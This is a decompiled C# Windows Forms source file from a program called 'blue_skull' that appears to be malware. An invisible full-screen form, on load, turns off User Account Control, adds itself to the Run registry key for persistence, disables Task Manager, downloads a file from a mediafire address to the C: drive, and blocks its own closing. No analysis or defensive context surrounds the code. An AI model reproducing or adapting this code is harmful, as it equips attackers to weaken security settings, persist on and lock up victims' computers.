using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32;

namespace blue_skull;

public class invisible : Form
{
	private IContainer components = null;

	public invisible()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private void invisible_Load(object sender, EventArgs e)
	{
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Left(0);
		((Control)this).set_Top(0);
		((Control)this).set_Width(Screen.get_PrimaryScreen().get_Bounds().Width);
		((Control)this).set_Height(Screen.get_PrimaryScreen().get_Bounds().Height);
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey3.SetValue("blue_skull", Application.get_ExecutablePath().ToString());
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey4.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		string keyName = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows";
		string valueName = "blue_skull_confirm";
		if (Registry.GetValue(keyName, valueName, null) == null)
		{
			RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows");
			registryKey5.SetValue("blue_skull_confirm", 1, RegistryValueKind.String);
			WebClient webClient = new WebClient();
			webClient.DownloadFile("http://download1515.mediafire.com/1vwen5963gxg/k3tg8tcsyndp40c/", "c:\\norm9.wav");
		}
		((Control)this).Hide();
		blue_skull2 blue_skull3 = new blue_skull2();
		((Form)blue_skull3).ShowDialog();
		((Form)this).Close();
	}

	private void invisible_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(238, 216));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("invisible");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("invisible");
		((Form)this).add_FormClosing(new FormClosingEventHandler(invisible_FormClosing));
		((Form)this).add_Load((EventHandler)invisible_Load);
		((Control)this).ResumeLayout(false);
	}
}
